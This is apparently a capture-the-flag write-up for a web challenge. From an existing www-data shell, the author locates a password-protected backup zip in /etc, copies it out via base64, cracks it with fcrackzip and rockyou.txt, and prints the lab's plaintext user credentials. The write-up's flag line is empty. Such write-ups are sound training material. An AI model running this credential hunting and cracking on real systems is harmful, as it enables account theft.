# 0x02 Beanie Baby Flagbearer
> 100pts

## Category
> Web

## Briefing
> Look around the file system for credz.

## Solution
Using our shell from earlier:

```console
www-data@54591b768b7d:/var/www/beanie$ find / -type f -name 'password*' 2>/dev/null
<www/beanie$ find / -type f -name 'password*' 2>/dev/null
/var/lib/pam/password
/var/cache/debconf/passwords.dat
/etc/passwords.bak
www-data@54591b768b7d:/var/www/beanie$ file /etc/passwords.bak
file /etc/passwords.bak
/etc/passwords.bak: Zip archive data, at least v2.0 to extract
www-data@54591b768b7d:/var/www/beanie$ cat /etc/passwords.bak | base64 -w0
cat /etc/passwords.bak | base64 -w0
UEsDBBQACQAIAH2bN06rNm7WWQAAAFUAAAANABwAcGFzc3dvcmRzLnR4dFVUCQADjgZJXJAGSVx1eAsAAQQAAAAABAAAAAAN293ldIDcJYn2HZ8oqv+0xp/rj0SN3Qe+oZKcuZaTVdCsMkmM6ikJuPj//ebDuZyCj6ajo/5U1tgmc5VPCYm8WhnGfOvNJUpOkjfLihCJRbKrdLYxqSSi+VBLBwirNm7WWQAAAFUAAABQSwECHgMUAAkACAB9mzdOqzZu1lkAAABVAAAADQAYAAAAAAABAAAApIEAAAAAcGFzc3dvcmRzLnR4dFVUBQADjgZJXHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAFMAAACwAAAAAAA=www-data@54591b768b7d:/var/www/beanie$
```

In another terminal, we can make use of the zip data and crack the password:

```console
CDSkids@kali:~/Desktop$ echo "UEsDBBQACQAIAH2bN06rNm7WWQAAAFUAAAANABwAcGFzc3dvcmRzLnR4dFVUCQADjgZJXJAGSVx1eAsAAQQAAAAABAAAAAAN293ldIDcJYn2HZ8oqv+0xp/rj0SN3Qe+oZKcuZaTVdCsMkmM6ikJuPj//ebDuZyCj6ajo/5U1tgmc5VPCYm8WhnGfOvNJUpOkjfLihCJRbKrdLYxqSSi+VBLBwirNm7WWQAAAFUAAABQSwECHgMUAAkACAB9mzdOqzZu1lkAAABVAAAADQAYAAAAAAABAAAApIEAAAAAcGFzc3dvcmRzLnR4dFVUBQADjgZJXHV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAFMAAACwAAAAAAA=" | base64 -d >password.bak.zip
CDSkids@kali:~/Desktop$ unzip password.bak.zip
Archive:  password.bak.zip
[password.bak.zip] passwords.txt password:
   skipping: passwords.txt           incorrect password
CDSkids@kali:~/Desktop$ fcrackzip -D -v -u -p rockyou.txt password.bak.zip
found file 'passwords.txt', (size cp/uc     89/    85, flags 9, chk 9b7d)
checking pw buday1

PASSWORD FOUND!!!!: pw == tybeanie
CDSkids@kali:~/Desktop$ unzip password.bak.zip
Archive:  password.bak.zip
[password.bak.zip] passwords.txt password:
  inflating: passwords.txt
CDSkids@kali:~/Desktop$ cat passwords.txt
#user passwords, don't lose

flagbearer eiJaex9v
flagholder ieYuoth8
flagger sohh0Ben
```

## Flag
Flag: ``